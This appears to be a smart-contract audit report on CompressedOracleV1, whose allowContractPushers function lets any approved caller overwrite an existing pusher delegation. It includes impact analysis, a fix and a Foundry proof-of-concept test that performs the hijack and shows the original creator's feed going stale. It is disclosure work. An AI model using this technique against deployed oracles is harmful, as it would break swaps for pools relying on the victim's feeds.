### Title
`allowContractPushers` Silently Overwrites Existing Namespace Delegation, Allowing Any Approved Caller to Redirect a Contract Pusher Away from Its Original Creator — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowContractPushers` unconditionally overwrites `namespaceRemapping[pusher]` with `msg.sender` whenever the pusher contract's live `isPusher(msg.sender)` returns `true`. There is no guard that checks whether the pusher is already delegated to a different creator. If a contract pusher's `isPusher` returns `true` for more than one address — a realistic design for shared oracle infrastructure — any of those addresses can silently redirect the pusher's future slot writes away from the original creator's namespace, causing that creator's feeds to go permanently stale and breaking every pool swap that depends on them.

---

### Finding Description

`CompressedOracleV1` stores a single `mapping(address => address) public namespaceRemapping` that maps a pusher address to the creator namespace it writes into. [1](#0-0) 

`allowContractPushers` is the contract-pusher delegation path. Its only authorization check is a live `staticcall` to `pusher.isPusher(msg.sender)`. If that call returns `true`, the function unconditionally writes `namespaceRemapping[pusher] = msg.sender`: [2](#0-1) 

There is **no check** that `namespaceRemapping[pusher]` is already set to a different creator. The write is a plain overwrite.

Compare this with the EOA path `allowPushers`, where the pusher's EIP-191 signature binds the specific creator (`msg.sender`) into the signed digest: [3](#0-2) 

For EOA pushers, a signature for creator A cannot be replayed by creator B because `msg.sender` is part of the hash. For contract pushers, no such binding exists — the live `isPusher` call is re-evaluated fresh on every invocation, so any caller the pusher contract approves can overwrite the mapping at any time.

The `fallback` push path resolves the namespace from `namespaceRemapping[msg.sender]`, falling back to `msg.sender` only when the mapping is zero: [4](#0-3) 

Once the mapping is overwritten to creator B, every subsequent push from the contract pusher lands in B's namespace. Creator A's feeds receive no further updates.

The `feedIdOf` function encodes the creator address directly into the feed ID: [5](#0-4) 

A pool registered for `feedIdOf(creatorA, slot, pos)` cannot be re-pointed to B's namespace — the feed ID is immutable. The pool's price provider will keep reading A's namespace, which now receives no updates.

---

### Impact Explanation

`AnchoredPriceProvider._readLeg` calls `IPricedOracle(address(offchainOracle)).price(feedId, msg.sender)` and then applies a staleness check: [6](#0-5) 

Once creator A's feeds stop being updated, `refTime` falls behind `block.timestamp` by more than `MAX_REF_STALENESS`, causing `_readLeg` to return `ok = false`. `getBidAndAskPrice` then returns the `(0, type(uint128).max)` sentinel, which triggers `FeedStalled`: [7](#0-6) 

Every pool swap that calls through this provider reverts. Swap functionality is permanently broken for all pools backed by creator A's feeds until the creator deploys a new pusher contract and re-establishes delegation — an operational recovery that requires off-chain coordination and new on-chain transactions.

---

### Likelihood Explanation

The attack requires a contract pusher whose `isPusher` returns `true` for more than one address. This is a realistic design for shared oracle infrastructure (e.g., a multi-operator aggregator, a DAO-controlled pusher, or any contract that whitelists a set of authorized callers rather than a single one). The test suite itself demonstrates this with `MockPusherAllowed`, which returns `true` for any caller: [8](#0-7) 

The call is permissionless — no admin role, no fee, no timelock. Any address that the pusher contract approves can execute the overwrite in a single transaction. The original creator receives no on-chain notification (the `PusherAuthorized` event names the new creator, not the displaced one).

---

### Recommendation

Before writing `namespaceRemapping[pusher] = msg.sender`, check that the pusher is not already delegated to a different creator:

```solidity
function allowContractPushers(address[] calldata pushers) external {
    uint256 l = pushers.length;
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];

        if (pusher == msg.sender) revert NoSelfRemapping();

        // NEW: prevent silent overwrite of an existing delegation
        address existing = namespaceRemapping[pusher];
        if (existing != address(0) && existing != msg.sender) {
            revert AlreadyDelegated(pusher, existing);
        }

        (bool ok, bytes memory res) = pusher.staticcall(
            abi.encodeWithSignature("isPusher(address)", msg.sender)
        );
        require(ok);
        require(abi.decode(res, (bool)));

        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

The same guard should be applied to `allowPushers` for consistency, even though the signature binding already prevents cross-creator replay on that path.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from
    "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "smart-contracts-poc/contracts/oracles/utils/U64x32.sol";

/// Shared pusher: isPusher returns true for ANY caller.
contract SharedPusher {
    function isPusher(address) external pure returns (bool) { return true; }
}

contract NamespaceHijackPoC is Test {
    CompressedOracleV1 oracle;
    SharedPusher pusherContract;

    address creatorA = address(0xAAAA);
    address creatorB = address(0xBBBB);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusherContract = new SharedPusher();
        vm.warp(1_700_000_000);
    }

    function test_hijack() public {
        // Step 1: creatorA legitimately delegates the shared pusher.
        vm.prank(creatorA);
        address[] memory pushers = new address[](1);
        pushers[0] = address(pusherContract);
        oracle.allowContractPushers(pushers);
        assertEq(oracle.namespaceRemapping(address(pusherContract)), creatorA);

        // Step 2: creatorB silently overwrites the mapping.
        vm.prank(creatorB);
        oracle.allowContractPushers(pushers);
        assertEq(
            oracle.namespaceRemapping(address(pusherContract)),
            creatorB,          // mapping now points to B
            "hijack succeeded"
        );

        // Step 3: pusherContract pushes a price — it lands in B's namespace, not A's.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = (uint48(1_000_000) << 16) | (uint48(5) << 8) | uint48(3);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId = 0
        word |= uint256(raw) << 208;                       // position 0

        vm.prank(address(pusherContract));
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // A's feed is empty (stale → pool swaps revert FeedStalled).
        IOffchainOracle.OracleData memory dataA =
            oracle.getOracleData(oracle.feedIdOf(creatorA, 0, 0));
        assertEq(dataA.price, 0, "A's feed is stale");

        // B's feed has the price.
        IOffchainOracle.OracleData memory dataB =
            oracle.getOracleData(oracle.feedIdOf(creatorB, 0, 0));
        assertGt(dataB.price, 0, "B's feed received the push");
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L29-29)
```text
    mapping(address => address) public namespaceRemapping;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L49-53)
```text
    function feedIdOf(address creator, uint8 slotIndex, uint8 positionIndex) public view returns (bytes32) {
        return bytes32(
            uint256(uint160(creator)) << 96 | block.chainid << 16 | uint256(slotIndex) << 8 | positionIndex
        );
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-207)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L217-233)
```text
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L214-217)
```text
    function getBidAndAskPrice() external override returns (uint128 bid, uint128 ask) {
        (bid, ask) = _getBidAndAskPrice();
        if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L280-283)
```text
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);
```

**File:** smart-contracts-poc/test/oracles/compressed/CompressedOracleContractPushers.t.sol (L11-14)
```text
contract MockPusherAllowed {
    function isPusher(address) external pure returns (bool) {
        return true;
    }
```
